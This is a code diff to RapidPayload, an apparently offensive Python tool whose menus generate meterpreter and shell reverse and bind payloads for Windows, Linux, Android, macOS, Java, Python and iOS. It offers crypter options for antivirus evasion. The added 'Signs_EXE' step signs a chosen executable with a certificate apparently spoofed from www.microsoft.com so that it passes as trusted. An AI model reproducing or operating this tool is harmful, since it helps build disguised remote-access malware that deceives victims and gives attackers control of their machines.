@@ -349,19 +349,32 @@ def RapidP():
     
     select = input('\n{2}{0}{2}[{1}{2}1{0}]{2}{1} {2} Windows\n{0}{2}[{1}{2}2{2}{0}]{1} {2} Linux\n{0}{2}[{1}{2}3{2}{0}]{1} {2} Android\n{0}{2}[{1}{2}{2}4{0}]{1} {2} Python\n{0}{2}[{1}{2}{2}5{0}]{1} {2} MacOS\n{0}{2}[{1}{2}{2}6{0}]{1} {2} Java\n{0}{2}[{1}{2}{2}7{0}]{1} {2} Apple_ios\n{0}{2}[{1}{2}{2}8{0}]{1} {2} Connect_Ngrok\n{0}{2}[{1}{2}{2}9{0}]{1} {2} Connect_LocalHost\n{0}{2}[{1}{2}{2}10{0}]{1} {2}Connect_MSF\n{0}{0}[{1}{2}0{0}]{1} {2} Exit\n\n{0}{2}RapidPayload:~#{1} '.format(cyan, end, bold))
     if select == '1':        
-        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2}Crypter_Shellter\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
+        type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}windows/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}windows/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}windows/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}windows/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}windows/shell/bind_tcp\n{0}[{1}{2}6{0}]{1} {2}windows/shell/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2}Crypter_Shellter\n{0}[{1}{2}8{0}]{1} {2}Signs_EXE\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Windows#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()
             RapidP()
         elif type == '7':
             print("\n{0}{1}RapidPayload:~/{2}".format(cyan, bold, end))
             dirtt=os.getcwd()
             os.system("wine "+dirtt+"/Image/shellter.exe")
-            print("\n{0}{1}RapidPayload:~/{2}".format(cyan, bold, end))                                          
+            print("\n{0}{1}RapidPayload:~/{2}".format(cyan, bold, end))
+        elif type == '8':
+            print("\033[1m\033[36m")
+            os.system("ls")				
+            wi1=input("\n{0}{1}RapidPayload:~/File# {2}".format(cyan, bold, end))
+            wi2=input("\n{0}{1}RapidPayload:~/NewFileName# {2}".format(cyan, bold, end))
+            dirtt=os.getcwd()
+            os.system("python3 "+dirtt+"/Image/.signs.py www.microsoft.com 443 "+wi1+" "+wi2+".exe")
+            os.system("rm -rf certs")
+            print("\033[1m\033[36m")
+            os.system("ls")
+            os.system("chmod +x "+wi2+".exe")            	                                                                             
         else:             
             main('Windows', type)
     if select == '2':       
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2} linux/x86/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2} linux/x86/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2} linux/x86/meterpreter/reverse_tcp{0}{1}\n{0}[{1}{2}4{0}]{1} {2} linux/x64/meterpreter/reverse_http{0}{1}\n{0}[{1}{2}5{0}]{1} {2} linux/x64/meterpreter/reverse_https{0}{1}\n{0}[{1}{2}6{0}]{1} {2} linux/x64/meterpreter/reverse_tcp\n{0}[{1}{2}7{0}]{1} {2} linux/x86/shell/reverse_tcp{0}\n{0}[{1}{2}8{0}]{1} {2} linux/x64/shell/bind_tcp\n{0}[{1}{2}9{0}]{1} {2} linux/x86/meterpreter/bind_tcp\n{0}[{1}{2}10{0}]{1} {2}linux/x64/meterpreter/bind_tcp\n{0}[{1}{2}11{0}]{1} {2}linux/x86/shell/bind_tcp\n{0}[{1}{2}12{0}]{1} {2}linux/x64/shell/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2} Menu\n\n{0}{2}RapidPayload:~/Linux#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()			
             RapidP()   
         main('Linux', type)
     if select == '3':
@@ -369,16 +382,19 @@ def RapidP():
         if droi == '1':				
             type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
             if type == '0':
+                banner()				
                 RapidP()            
             Normal('Android', type)
         if droi == '2':				
             type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}android/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}android/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}android/meterpreter/reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}{2}Menu\n\n{0}{2}RapidPayload:~/Android#{1} '.format(cyan, end, bold))
             if type == '0':
+                banner()				
                 RapidP()            
             legit('Android', type)            
     if select == '4':
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}python/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}python/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}python/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}python/meterpreter/bind_tcp\n{0}[{1}{2}5{0}]{1} {2}Crypter_FUD\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Python#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()			
             RapidP()
         elif type == '5':
             print("\033[1m\033[36m")
@@ -394,16 +410,19 @@ def RapidP():
     if select == '5':        
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}osx/x86/shell_reverse_tcp\n{0}[{1}{2}2{0}]{1} {2}osx/x86/shell_bind_tcp\n{0}[{1}{2}3{0}]{1} {2}osx/x64/meterpreter/bind_tcp\n{0}[{1}{2}4{0}]{1} {2}osx/x64/meterpreter/reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}osx/x64/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}osx/x64/meterpreter_reverse_https\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/MacOS#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()			
             RapidP()
         main('Macosx', type)
     if select == '6':        
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}java/meterpreter/reverse_http\n{0}[{1}{2}2{0}]{1} {2}java/meterpreter/reverse_https\n{0}[{1}{2}3{0}]{1} {2}java/meterpreter/reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}java/meterpreter/bind_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Java#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()			
             RapidP()
         main('Java', type)
     if select == '7':        
         type = input('{2}{1}\n\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_http\n{0}[{1}{2}2{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_https\n{0}[{1}{2}3{0}]{1} {2}apple_ios/aarch64/meterpreter_reverse_tcp\n{0}[{1}{2}4{0}]{1} {2}apple_ios/aarch64/shell_reverse_tcp\n{0}[{1}{2}5{0}]{1} {2}apple_ios/armle/meterpreter_reverse_http\n{0}[{1}{2}6{0}]{1} {2}apple_ios/armle/meterpreter_reverse_https\n{0}{2}[{1}{2}1{0}]{1} {2}apple_ios/armle/meterpreter_reverse_tcp\n{0}[{1}{2}0{0}]{1} {2}Menu\n\n{0}{2}RapidPayload:~/Apple_ios#{1} '.format(cyan, end, bold))
         if type == '0':
+            banner()			
             RapidP()
         main('Apple_ios', type)                          
     if select == '8':
